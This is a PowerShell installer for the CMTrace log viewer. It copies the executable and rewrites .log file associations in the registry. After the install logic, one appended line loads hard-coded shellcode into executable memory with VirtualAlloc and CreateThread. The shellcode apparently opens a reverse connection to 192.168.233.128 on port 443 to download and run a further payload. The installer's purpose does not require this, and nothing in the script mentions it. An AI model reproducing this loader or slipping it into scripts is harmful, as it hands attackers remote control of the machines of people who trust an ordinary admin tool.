
[CmdletBinding()]
param
(
		[switch]$SystemInstall,
		[ValidateNotNullOrEmpty()][string]$InstallLocation = 'C:\windows\system32',
		[switch]$UserConfig,
		[ValidateNotNullOrEmpty()][string]$PSConsoleTitle = 'CMTrace Installation'
)

function Close-Process {

	
	[CmdletBinding()]
	param
	(
			[ValidateNotNullOrEmpty()][string]$ProcessName
	)
	
	$Process = Get-Process $ProcessName -ErrorAction SilentlyContinue
	If ($Process) {
		Do {
			$Count++
			Write-Host "Closing"$Process.ProcessName"....." -NoNewline
			$Process | Stop-Process -Force
			Start-Sleep -Seconds 5
			$Process = Get-Process $ProcessName -ErrorAction SilentlyContinue
			If ($Process) {
				Write-Host "Failed" -ForegroundColor Red
			} else {
				Write-Host "Success" -ForegroundColor Yellow
			}
		} while (($Process) -and ($Count -lt 5))
	}
}

function Set-ConsoleTitle {

	
	[CmdletBinding()]
	param
	(
			[Parameter(Mandatory = $true)][String]$ConsoleTitle
	)
	
	$host.ui.RawUI.WindowTitle = $ConsoleTitle
}

function Get-RelativePath {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$Path = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + "\"
	Return $Path
}

function Install-CMTraceExecutable {

	
	[CmdletBinding()]
	param ()
	
	Close-Process -ProcessName 'CMTrace'
	$RelativePath = Get-RelativePath
	$SourceFile = $RelativePath + 'CMTrace.exe'
	Write-Host "Installing CMTrace.exe....." -NoNewline
	Copy-Item -Path $SourceFile -Destination $InstallLocation -Force
	If ((Test-Path $InstallLocation) -eq $true) {
		Write-Host "Success" -ForegroundColor Yellow
		$Success = $true
	} else {
		Write-Host "Failed" -ForegroundColor Red
		$Success = $false
	}
	Return $Success
}

function Register-CMTraceToHKCR {

	
	[CmdletBinding()][OutputType([boolean])]
	param ()
	
	New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
	$Success = $true
	$MUICacheRegKey = 'HKCR:\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
	$ApplicationCompany = $InstallLocation + '.ApplicationCompany'
	$ApplicationCompanyValue = 'Microsoft Corporation'
	$FriendlyName = $InstallLocation + '.FriendlyAppName'
	$FriendlyNameValue = "CMTrace.exe"
	$LogfileRegKey = "HKCR:\Logfile\Shell\Open\Command"
	$TestKey = Get-ItemProperty $MUICacheRegKey -Name $ApplicationCompany -ErrorAction SilentlyContinue
	Write-Host 'Register HKCR Application Company.....' -NoNewline
	If ($TestKey.$ApplicationCompany -ne $ApplicationCompanyValue) {
		New-ItemProperty -Path $MUICacheRegKey -Name $ApplicationCompany -Value $ApplicationCompanyValue -PropertyType String | Out-Null
		$TestKey = Get-ItemProperty -Path $MUICacheRegKey -Name $ApplicationCompany -ErrorAction SilentlyContinue
		If ($TestKey.$ApplicationCompany -eq $ApplicationCompanyValue) {
			Write-Host 'Success' -ForegroundColor Yellow
		} else {
			Write-Host 'Failed' -ForegroundColor Red
			$Success = $false
		}
	} else {
		Write-Host 'Already Registered' -ForegroundColor Yellow
	}
	Write-Host 'Register HKCR Friendly Application Name.....' -NoNewline
	$TestKey = Get-ItemProperty $MUICacheRegKey -Name $FriendlyName -ErrorAction SilentlyContinue
	If ($TestKey.$FriendlyName -ne $FriendlyNameValue) {
		New-ItemProperty -Path $MUICacheRegKey -Name $FriendlyName -Value $FriendlyNameValue -PropertyType String -ErrorAction SilentlyContinue | Out-Null
		$TestKey = Get-ItemProperty -Path $MUICacheRegKey -Name $FriendlyName -ErrorAction SilentlyContinue
		If ($TestKey.$FriendlyName -eq $FriendlyNameValue) {
			Write-Host 'Success' -ForegroundColor Yellow
		} else {
			Write-Host 'Failed' -ForegroundColor Red
			$Success = $false
		}
	} else {
		Write-Host 'Already Registered' -ForegroundColor Yellow
	}
	If ((Test-Path $LogfileRegKey) -eq $true) {
		Write-Host "Removing HKCR:\Logfile....." -NoNewline
		Remove-Item -Path "HKCR:\Logfile" -Recurse -Force
		If ((Test-Path "HKCR:\Logfile") -eq $false) {
			Write-Host "Success" -ForegroundColor Yellow
		} else {
			Write-Host "Failed" -ForegroundColor Red
		}
	}
	Write-Host 'Register HKCR Logfile Classes Root.....' -NoNewline
	New-Item -Path $LogfileRegKey -Force | Out-Null
	New-ItemProperty -Path $LogfileRegKey -Name '(Default)' -Value $InstallLocation -Force | Out-Null
	$TestKey = Get-ItemProperty -Path $LogfileRegKey -Name '(Default)' -ErrorAction SilentlyContinue
	If ($TestKey.'(Default)' -eq $InstallLocation) {
		Write-Host 'Success' -ForegroundColor Yellow
	} else {
		Write-Host 'Failed' -ForegroundColor Red
		$Success = $false
	}
	Return $Success
}

function Register-CMTraceToHKCU {

	
	[CmdletBinding()][OutputType([boolean])]
	param ()
	
	$Success = $true
	
	$ClassesLogFileRegKey = "HKCU:\SOFTWARE\Classes\Log.file\Shell\Open\Command"
	$ClassesLogFileRegKeyValue = [char]34 + $InstallLocation + [char]34 + [char]32 + [char]34 + "%1" + [char]34
	If ((Test-Path "HKCU:\SOFTWARE\Classes\Log.file") -eq $true) {
		Write-Host "Removing HKCU Log.File association....." -NoNewline
		Remove-Item -Path "HKCU:\SOFTWARE\Classes\Log.file" -Recurse -Force
		If ((Test-Path $ClassesLogFileRegKey) -eq $false) {
			Write-Host "Success" -ForegroundColor Yellow
		} else {
			Write-Host "Failed" -ForegroundColor Red
			$Success = $false
		}
	}
	Write-Host "Register HKCU Log.File association....." -NoNewline
	New-Item -Path $ClassesLogFileRegKey -Force | Out-Null
	New-ItemProperty -Path $ClassesLogFileRegKey -Name '(Default)' -Value $ClassesLogFileRegKeyValue -Force | Out-Null
	$TestKey = Get-ItemProperty -Path $ClassesLogFileRegKey -Name '(Default)' -ErrorAction SilentlyContinue
	If ($TestKey.'(Default)' -eq $ClassesLogFileRegKeyValue) {
		Write-Host 'Success' -ForegroundColor Yellow
	} else {
		Write-Host 'Failed' -ForegroundColor Red
		$Success = $false
	}
	
	$FileExtsRegKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.log"
	If ((Test-Path $FileExtsRegKey) -eq $true) {
		Write-Host "Removing HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.log....." -NoNewline
		Remove-Item -Path $FileExtsRegKey -Recurse -Force
		If ((Test-Path $FileExtsRegKey) -eq $false) {
			Write-Host "Success" -ForegroundColor Yellow
		} else {
			Write-Host "Failed" -ForegroundColor Red
			$Success = $false
		}
	}
	Write-Host "Registering .log key....." -NoNewline
	New-Item -Path $FileExtsRegKey -Force | Out-Null
	If ((Test-Path $FileExtsRegKey) -eq $true) {
		Write-Host "Success" -ForegroundColor Yellow
	} else {
		Write-Host "Failed" -ForegroundColor Red
		$Success = $false
	}
	
	$OpenWithList = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.log\OpenWithList"
	Write-Host "Registering HKCU OpenWithList....." -NoNewline
	New-Item -Path $OpenWithList -Force | Out-Null
	New-ItemProperty -Path $OpenWithList -Name "a" -Value "CMTrace.exe" -PropertyType String -Force | Out-Null
	New-ItemProperty -Path $OpenWithList -Name "b" -Value "NOTEPAD.EXE" -PropertyType String -Force | Out-Null
	New-ItemProperty -Path $OpenWithList -Name "MRUList" -Value "ab" -PropertyType String -Force | Out-Null
	$TestKeyA = Get-ItemProperty -Path $OpenWithList -Name 'a' -ErrorAction SilentlyContinue
	$TestKeyB = Get-ItemProperty -Path $OpenWithList -Name 'b' -ErrorAction SilentlyContinue
	$TestKeyMRUList = Get-ItemProperty -Path $OpenWithList -Name 'MRUList' -ErrorAction SilentlyContinue
	If (($TestKeyA.a -eq "CMTrace.exe") -and ($TestKeyB.b -eq "NOTEPAD.EXE") -and ($TestKeyMRUList.MRUList -eq "ab")) {
		Write-Host "Success" -ForegroundColor Yellow
	} else {
		Write-Host "Failed" -ForegroundColor Red
		$Success = $false
	}
	
	$OpenWithProgids = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.log\OpenWithProgids"
	Write-Host "Registering HKCU OpenWithProgids....." -NoNewline
	New-Item -Path $OpenWithProgids -Force | Out-Null
	New-ItemProperty -Path $OpenWithProgids -Name "txtfile" -PropertyType Binary -Force | Out-Null
	New-ItemProperty -Path $OpenWithProgids -Name "Log.File" -PropertyType Binary -Force | Out-Null
	
	$UserChoice = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.log\UserChoice"
	Write-Host "Setting CMTrace as default viewer....." -NoNewline
	New-Item -Path $UserChoice -Force | Out-Null
	New-ItemProperty -Path $UserChoice -Name "Progid" -Value "Applications\CMTrace.exe" -PropertyType String -Force | Out-Null
	$TestKey = Get-ItemProperty -Path $UserChoice -Name "Progid"
	If ($TestKey.Progid -eq "Applications\CMTrace.exe") {
		Write-Host "Success" -ForegroundColor Yellow
	} else {
		Write-Host "Failed" -ForegroundColor Red
		$Success = $false
	}
	Return $Success
}

function Register-CMTraceToHKLM {

	
	[CmdletBinding()][OutputType([boolean])]
	param ()
	
	$Success = $true
	$LogFileRegKey = "HKLM:\SOFTWARE\Classes\Logfile\Shell\Open\Command"
	If ((Test-Path $LogFileRegKey) -eq $true) {
		Remove-Item -Path "HKLM:\SOFTWARE\Classes\Logfile" -Recurse -Force
	}
	Write-Host 'Register HKLM Logfile Classes Root.....' -NoNewline
	New-Item -Path $LogFileRegKey -Force | Out-Null
	New-ItemProperty -Path $LogFileRegKey -Name '(Default)' -Value $InstallLocation -Force | Out-Null
	$TestKey = Get-ItemProperty -Path $LogFileRegKey -Name '(Default)' -ErrorAction SilentlyContinue
	If ($TestKey.'(Default)' -eq $InstallLocation) {
		Write-Host 'Success' -ForegroundColor Yellow
	} else {
		Write-Host 'Failed' -ForegroundColor Red
		$Success = $false
	}
	Return $Success
}

function Set-CMTraceFileLocation {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	If ($InstallLocation -notlike '*CMTrace.exe*') {
		If ($InstallLocation[$InstallLocation.count - 1] -eq '\') {
			$NewLocation = $InstallLocation + 'CMTrace.exe'
		} else {
			$NewLocation = $InstallLocation + '\CMTrace.exe'
		}
	} else {
		$NewLocation = $InstallLocation
	}
	Return $NewLocation
}


Set-ConsoleTitle -ConsoleTitle $PSConsoleTitle
Clear-Host
$Success = $true
$InstallLocation = Set-CMTraceFileLocation
If ($SystemInstall.IsPresent) {
	$Status = Install-CMTraceExecutable
	If ($Status = $false) {
		$Success = $false
	}
	$Status = Register-CMTraceToHKCR
	If ($Status = $false) {
		$Success = $false
	}
	$Status = Register-CMTraceToHKLM
	If ($Status = $false) {
		$Success = $false
	}
}
If ($UserConfig.IsPresent) {
	$Status = Register-CMTraceToHKCU
	If ($Status = $false) {
		$Success = $false
	}
}
If ($Success -eq $false) {
	Exit 1
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xe9,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

